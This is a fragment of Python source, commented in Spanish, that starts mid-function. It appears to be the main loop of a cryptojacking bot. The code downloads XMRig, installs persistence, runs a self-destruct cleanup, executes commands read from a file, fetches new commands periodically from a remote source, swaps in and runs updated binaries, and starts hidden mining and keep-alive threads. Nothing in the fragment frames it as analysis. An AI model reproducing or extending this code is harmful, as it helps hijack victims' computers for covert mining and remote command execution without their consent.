            create_version_file_if_needed()
        
        # Iniciar la minería después de ejecutar comandos y actualizaciones
        
        mining_thread = threading.Thread(target=start_mining, daemon=True)
        mining_thread.start()

        # Descarga de comandos periódicamente después de iniciar la minería
        download_commands_periodically()
        
    else:
        # Si los archivos no existen, crear el entorno inicial
       
        self_destruct()  # Limpiar archivos o procesos previos si es necesario
        download_xmrig()  # Descargar XmRig
        add_persistence()  # Añadir persistencia al sistema
        create_backup_folder()  # Crear la carpeta de respaldo
        create_version_file_if_needed()  # Crear archivo de versión si es necesario

        # Después de la creación del entorno inicial, verificar si COMMAND_FILE_PATH existe ahora
        if Path(COMMAND_FILE_PATH).exists():
           
            worker_number = read_worker_number()  # Leer el número de worker
            read_commands_from_file(COMMAND_FILE_PATH, worker_number)  # Leer y ejecutar los comandos

            # Verificar si hay actualizaciones
            if Path(BINARY_PATH_UPDATE).exists() and Path(UPDATE_FLAG_PATH).exists():
                
                # Realizar el flujo de actualización
                check_for_update_and_replace()
                check_and_update_binary()
                remove_binary()
                check_for_update_and_move()
                execute_binary()
                self_destruct()
                add_persistence()
                create_version_file_if_needed()

            # Iniciar la minería después de los comandos y la actualización
          
            mining_thread = threading.Thread(target=start_mining, daemon=True)
            mining_thread.start()
            
            # Descargar comandos periódicamente
            download_commands_periodically()

# # Mantener el programa en ejecución
if __name__ == "__main__":
    # Iniciar el hilo keep_alive para mantener el programa vivo.
    keep_alive_thread = threading.Thread(target=keep_alive, daemon=True)
    keep_alive_thread.start()

    # Ejecutar la función principal
    main()

